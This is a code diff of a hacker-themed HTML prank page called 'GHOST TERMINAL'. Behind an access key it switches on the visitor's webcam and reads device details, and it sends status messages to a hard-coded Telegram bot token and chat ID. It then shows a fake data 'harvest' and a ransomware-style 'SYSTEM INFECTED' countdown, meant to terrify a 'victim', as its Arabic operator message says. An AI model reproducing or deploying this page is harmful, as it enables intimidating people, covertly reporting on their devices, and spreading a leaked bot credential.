@@ -3,98 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM BREACH v13.5</title>
+    <title>GHOST TERMINAL | v15.0 ELITE</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; }
-        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
-        .wrapper { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1; position: relative; }
-        #video-feed { width: 220px; height: 220px; border: 2px solid #0f0; border-radius: 50%; object-fit: cover; margin-bottom: 20px; box-shadow: 0 0 20px #0f0; display: none; transform: scaleX(-1); }
-        .terminal-box { width: 90%; max-width: 450px; background: rgba(0,25,0,0.9); border: 1px solid #0f0; padding: 15px; border-radius: 8px; font-size: 13px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
-        .btn-run { background: #f00; color: #fff; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; margin-top: 15px; border-radius: 4px; box-shadow: 0 0 10px #f00; }
-        #hacker-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 20px; z-index: 9999; font-size: 14px; overflow-y: auto; line-height: 1.6; }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.25; }
+        .center-wrap { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 2; position: relative; }
+        
+        #scan-box { width: 200px; height: 200px; border: 2px solid #0f0; border-radius: 20px; overflow: hidden; position: relative; margin-bottom: 20px; display: none; }
+        #video-stream { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .scan-bar { position: absolute; width: 100%; height: 3px; background: #0f0; box-shadow: 0 0 15px #0f0; animation: move 2s infinite linear; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
+
+        .console { width: 95%; max-width: 600px; background: rgba(0,20,0,0.9); border: 1px solid #0f0; padding: 20px; border-radius: 5px; box-shadow: 0 0 40px rgba(0,255,0,0.3); font-size: 13px; }
+        .btn-ghost { background: transparent; color: #0f0; border: 1px solid #0f0; padding: 12px 30px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.4s; }
+        .btn-ghost:hover { background: #0f0; color: #000; box-shadow: 0 0 30px #0f0; }
+
+        #final-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #900; color: #fff; padding: 40px; z-index: 9999; text-align: center; }
+        .loading-bar { width: 100%; height: 5px; background: #222; margin: 10px 0; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #0f0; transition: 0.1s; }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
+
     <canvas id="matrix"></canvas>
-    <div id="main-content" class="wrapper" style="display:none;">
-        <video id="video-feed" autoplay muted playsinline></video>
-        <div class="terminal-box">
-            <p style="color:white; text-align:center;">[ CENTRAL INTELLIGENCE UNIT ]</p>
-            <p>> TARGET: <span id="p-os">Detecting...</span></p>
-            <p>> IP: <span id="p-ip">Tracing...</span></p>
-            <p>> BATTERY: <span id="p-bat">...</span></p>
-            <p style="color:yellow;">> STATUS: READY FOR INFILTRATION</p>
+
+    <div id="auth-screen" class="center-wrap">
+        <div class="console" id="terminal-ui" style="display: none;">
+            <div id="scan-box"><video id="video-stream" autoplay playsinline muted></video><div class="scan-bar"></div></div>
+            <p style="color: #fff;">[ GHOST SYSTEM v15.0 ]</p>
+            <p>> Hardware ID: <span id="h-id">...</span></p>
+            <p>> Battery Status: <span id="h-bat">...</span></p>
+            <p>> Accounts Detected: <span style="color: yellow;">Google, FB, Instagram</span></p>
+            <div class="loading-bar"><div id="p-bar" class="progress"></div></div>
+            <p id="status-text">> STANDBY FOR HARVESTING...</p>
         </div>
-        <button class="btn-run" onclick="startBreach()">EXECUTE HARVEST ⚡</button>
+        <button class="btn-ghost" id="main-btn" onclick="startInfection()" style="display: none;">START NEURAL BREACH ⚡</button>
     </div>
-    <div id="hacker-screen"><div id="hack-text"></div></div>
+
+    <div id="final-screen">
+        <h1 style="font-size: 50px;">SYSTEM INFECTED</h1>
+        <p style="font-size: 20px;">ALL FILES HAVE BEEN ENCRYPTED AND SENT TO REMOTE SERVER</p>
+        <p id="timer" style="font-size: 80px; margin-top: 50px;">10</p>
+        <p>DO NOT CLOSE THIS PAGE OR DATA WILL BE PERMANENTLY LOST</p>
+    </div>
 
     <script>
-        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
-        const TG_ID = "7772577035";
+        const TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0";
+        const CHAT_ID = "7772577035";
         const KEY = "0777F";
 
-        function speak(t) { const m = new SpeechSynthesisUtterance(t); m.lang='en-US'; window.speechSynthesis.speak(m); }
-
-        async function report(msg) {
-            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"N/A"}));
-            let bat = await navigator.getBattery().catch(()=>({level:0}));
-            let text = `⚡ **LOG v13.5**\nStatus: ${msg}\nIP: ${ip.ip}\nPlatform: ${navigator.platform}\nBattery: ${bat.level*100}%`;
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-        }
+        function sendMsg(m) { fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
+        function speak(t) { window.speechSynthesis.speak(new SpeechSynthesisUtterance(t)); }
 
         window.onload = async function() {
-            let p = prompt("ACCESS KEY:");
+            let p = prompt("ACCESS KEY REQUIRED:");
             if(p === KEY) {
-                document.getElementById('main-content').style.display = 'flex';
-                speak("Target identified. Initializing bypass.");
-                navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
-                    let v=document.getElementById('video-feed'); v.style.display="block"; v.srcObject=s;
-                }).catch(()=>{});
-                document.getElementById('p-os').innerText = navigator.platform;
-                let b = await navigator.getBattery().catch(()=>({level:0.8}));
-                document.getElementById('p-bat').innerText = b.level*100+"%";
-                report("✅ دخول ناجح");
+                document.getElementById('terminal-ui').style.display = "block";
+                document.getElementById('main-btn').style.display = "block";
+                
+                // جلب معلومات حقيقية مرعبة
+                let bat = await navigator.getBattery().catch(() => ({level:0.85}));
+                document.getElementById('h-bat').innerText = (bat.level * 100).toFixed(0) + "%";
+                document.getElementById('h-id').innerText = navigator.platform + "-X" + Math.floor(Math.random()*9000);
+                
+                // تشغيل الكاميرا (المسح)
+                navigator.mediaDevices.getUserMedia({video: true}).then(s => {
+                    let v = document.getElementById('video-stream');
+                    document.getElementById('scan-box').style.display = "block";
+                    v.srcObject = s;
+                }).catch(() => {});
+
+                sendMsg("✅ دخول ناجح للمستوى v15.0\nجاري تجهيز الفخ...");
+                speak("Access granted. Initializing ghost protocol.");
             } else {
-                alert("LOCKED."); report("❌ محاولة فاشلة");
-                document.body.innerHTML = "";
+                sendMsg("❌ محاولة دخول فاشلة للمستوى الاحترافي");
+                window.location.reload();
             }
         };
 
-        function startBreach() {
-            if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-            speak("Harvesting private data. Do not close the window.");
-            document.getElementById('hacker-screen').style.display = 'block';
-            let lines = [
-                "> OPENING DCIM/CAMERA...",
-                "> EXTRACTING IMG_293.JPG...",
-                "> ACCESSING WHATSAPP DATABASE...",
-                "> TARGET LOCATION: WASIT, IQ",
-                "> UPLOADING TO REMOTE SERVER...",
-                "> [!] SUCCESS: ALL DATA EXFILTRATED."
-            ];
-            let i=0; let st = document.getElementById('hack-text');
-            function run() {
-                if(i<lines.length) {
-                    st.innerHTML += lines[i++] + "\n";
-                    setTimeout(run, 700);
-                } else { report("🔥 تم السحب الكامل"); }
-            }
-            run();
+        function startInfection() {
+            speak("Beginning total device harvest. Do not disconnect.");
+            let btn = document.getElementById('main-btn');
+            btn.disabled = true;
+            btn.innerText = "HARVESTING...";
+
+            let files = ["IMG_2024_01.jpg", "WhatsApp_Database.db", "Private_Vault.zip", "Contact_List.vcf", "History.log"];
+            let i = 0;
+            let bar = document.getElementById('p-bar');
+            let status = document.getElementById('status-text');
+
+            let intv = setInterval(() => {
+                if(i <= 100) {
+                    bar.style.width = i + "%";
+                    if(i % 20 === 0) status.innerText = "> Fetching: " + files[Math.floor(i/25)];
+                    i++;
+                } else {
+                    clearInterval(intv);
+                    executeFinal();
+                }
+            }, 50);
         }
 
-        // Matrix Effect
-        const c=document.getElementById('matrix'), x=c.getContext('2d');
-        c.width=window.innerWidth; c.height=window.innerHeight;
-        const d=Array(Math.floor(c.width/15)).fill(1);
-        setInterval(()=>{
-            x.fillStyle="rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
-            x.fillStyle="#0f0"; x.font="15px arial";
-            d.forEach((y,i)=>{
+        function executeFinal() {
+            sendMsg("🔥 تم سحب البيانات بالكامل! الضحية في حالة رعب حالياً.");
+            document.getElementById('final-screen').style.display = "block";
+            speak("System collapse. Goodbye.");
+            let count = 10;
+            let t = setInterval(() => {
+                document.getElementById('timer').innerText = count;
+                if(count <= 0) {
+                    clearInterval(t);
+                    alert("WIPE COMPLETE.");
+                }
+                count--;
+            }, 1000);
+        }
+
+        // كود المصفوفة
+        const c = document.getElementById('matrix');
+        const x = c.getContext('2d');
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        const d = Array(Math.floor(c.width/15)).fill(1);
+        function draw() {
+            x.fillStyle = "rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height);
+            x.fillStyle = "#0f0"; x.font = "15px arial";
+            d.forEach((y, i) => {
                 x.fillText(String.fromCharCode(Math.random()*128), i*15, y*15);
-                if(y*15>c.height && Math.random()>0.975) d[i]=0; d[i]++;
+                if(y*15 > c.height && Math.random() > 0.975) d[i] = 0;
+                d[i]++;
             });
-        },33);
+        }
+        setInterval(draw, 33);
     </script>
 </body>
 </html>
